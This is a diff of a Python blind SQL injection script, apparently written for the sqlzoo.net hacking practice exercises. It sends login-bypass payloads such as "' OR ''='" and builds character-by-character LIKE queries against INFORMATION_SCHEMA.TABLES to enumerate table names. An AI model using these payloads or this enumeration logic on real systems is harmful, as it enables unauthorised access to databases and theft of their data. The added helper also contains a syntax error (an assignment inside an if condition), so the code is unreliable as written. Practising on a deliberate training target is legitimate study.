@@ -358,21 +358,43 @@ def isVulnerable(url):
 
    """
    payload = "' OR ''='"
-   payload = NamePasswordDictionary(payload, name, password)
+   payload = NamePasswordDictionary(payload, "name", "password")
    txt = sendQuery(payload, url)
    return readQuery(txt)
 
-def characterInTableName():
+def characterInTableName(ch, url, index = "no index"):
    """
    https://sqlzoo.net/hack/24table.htm
-Is there a table called one in database test?
+   Is there a table called one in database test?
     "' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='test' AND TABLE_NAME='one') AND ''='"
 
    
 
 """
-   pass
+   payload = constructTableQuery(ch, index)
+   payload = NamePasswordDictionary(payload, "name", "password")
+   txt = sendQuery(payload, url)
+   return readQuery(txt)
 
+
+def constructTableQuery(ch, index):
+   """helper function for characterInTableName"""
+   payload = "' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='test' AND TABLE_NAME LIKE '"
+
+   tableStr = ""
+
+   if(index = "no index"):
+      tableStr += "%" + ch + "%"
+   elif(index >= 0):
+      tableStr += index * "_" + ch + "%"
+   else:
+      index *=  -1 
+      index -= 1
+      tableStr += "%" + ch + "_" * index 
+
+   payload += tableStr + "') AND ''='" 
+   #do I even need the AND ''=' part? it evaluates to '' = '' which is true so true/false AND true? Seems redundant
+   return payload
 
 def nTablesMatch():
    """ how many tables match
@@ -408,7 +430,7 @@ def constructDatabaseQuery(ch, index = "no index"):
    if(index == "no index"):
       nameStr += "%" + ch + "%"
    elif(index >= 0):
-      nameStr += index * "_" + ch
+      nameStr += index * "_" + ch + "%"
    else:
       index = -1 * index -1
       nameStr += "%" + ch + index * "_"
